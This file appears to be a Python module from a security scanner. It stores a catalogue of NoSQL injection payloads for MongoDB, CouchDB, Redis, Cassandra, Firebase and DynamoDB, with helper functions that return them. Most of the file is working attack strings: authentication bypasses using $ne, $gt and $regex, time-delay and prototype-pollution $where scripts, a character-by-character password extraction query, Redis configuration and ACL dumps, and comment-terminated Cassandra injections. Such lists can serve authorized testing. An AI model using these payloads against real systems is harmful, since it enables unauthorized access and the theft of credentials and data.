from __future__ import annotations

from copy import deepcopy

_ADVANCED_PAYLOADS: dict[str, list[str]] = {
    "mongodb": [
        '{"$where":"return true"}',
        '{"$where":"sleep(5000) || true"}',
        '{"$regex":".*"}',
        '{"$regex":"^(?s:.*)$"}',
        '{"$expr":{"$gt":[1,0]}}',
        '{"$expr":{"$eq":[{"$substrCP":["$password",0,1]},"a"]}}',
        '{"$ne":null}',
        '{"$gt":""}',
        '{"$jsonSchema":{"bsonType":"object"}}',
        '{"$jsonSchema":{"required":["username"]}}',
        '{"$jsonSchema":{"properties":{"password":{"bsonType":"string"}}}}',
        '[{"$match":{"$expr":{"$gt":[1,0]}}}]',
        '[{"$match":{"$expr":{"$gt":[{"$bsonSize":"$$ROOT"},0]}}}]',
        '[{"$project":{"p":{"$function":{"body":"function(){return 1}","args":[],"lang":"js"}}}}]',
        '[{"$project":{"userString":{"$toString":"$username"}}}]',
        '{"username":{"$in":["admin",{"$regex":".*"}]}}',
        '{"profile":{"$type":"object"}}',
        '{"profile":{"$exists":true},"$expr":{"$gt":[{"$strLenCP":{"$toString":"$password"}},0]}}',
        '{"$where":"return this && this.__proto__ && (this.__proto__.admin=true)"}',
        '{"$where":"return Object.keys(this).join(",").length >= 0"}',
    ],
    "couchdb": [
        '{"selector":{"_id":{"$gt":null}}}',
        '{"selector":{"_id":{"$regex":".*"}}}',
        '{"selector":{"type":{"$ne":"blocked"}}}',
        '{"selector":{"$or":[{"_id":{"$gt":null}},{"type":{"$exists":true}}]}}',
        '{"selector":{"$not":{"_id":null}}}',
        '{"selector":{"roles":{"$elemMatch":{"$eq":"admin"}}}}',
        '{"selector":{"$or":[{"roles":{"$in":["admin"]}},{"type":{"$regex":".*"}}]}}',
        '{"selector":{"profile":{"$type":"object"}}}',
    ],
    "redis": [
        "INFO",
        "PING",
        "CONFIG GET *",
        "MODULE LIST",
        "ACL LIST",
        "CLIENT LIST",
        "SLOWLOG GET 10",
    ],
    "cassandra": [
        "' OR token(id) > token(0)-- ",
        "' OR now()=now()-- ",
        "' OR cast(now() as text)!=''-- ",
        "' OR writetime(id) >= 0-- ",
        "' OR ttl(id) >= 0-- ",
        "' OR toTimestamp(now()) >= toTimestamp(now())-- ",
    ],
    "firebase": [
        '{"orderBy":"$key","startAt":""}',
        '{"orderBy":"$value","equalTo":true}',
        '{"shallow":true}',
        '{"orderBy":"$priority","limitToFirst":1}',
        '{"print":"pretty","format":"export"}',
    ],
    "dynamodb": [
        '{"FilterExpression":"attribute_exists(#id)","ExpressionAttributeNames":{"#id":"id"}}',
        '{"FilterExpression":"size(#pw) > :zero","ExpressionAttributeNames":{"#pw":"password"},"ExpressionAttributeValues":{":zero":{"N":"0"}}}',
        '{"ProjectionExpression":"#id,#role","ExpressionAttributeNames":{"#id":"id","#role":"role"}}',
        '{"FilterExpression":"contains(#roles,:admin)","ExpressionAttributeNames":{"#roles":"roles"},"ExpressionAttributeValues":{":admin":{"S":"admin"}}}',
    ],
}


def get_advanced_payloads(backend: str | None = None) -> list[str]:
    if backend is None:
        payloads: list[str] = []
        for items in _ADVANCED_PAYLOADS.values():
            payloads.extend(items)
        return payloads
    return list(_ADVANCED_PAYLOADS.get(str(backend).strip().lower(), []))


def get_advanced_payload_map() -> dict[str, list[str]]:
    return deepcopy(_ADVANCED_PAYLOADS)


def get_backend_names() -> list[str]:
    return sorted(_ADVANCED_PAYLOADS.keys())


__all__ = ["get_advanced_payload_map", "get_advanced_payloads", "get_backend_names"]
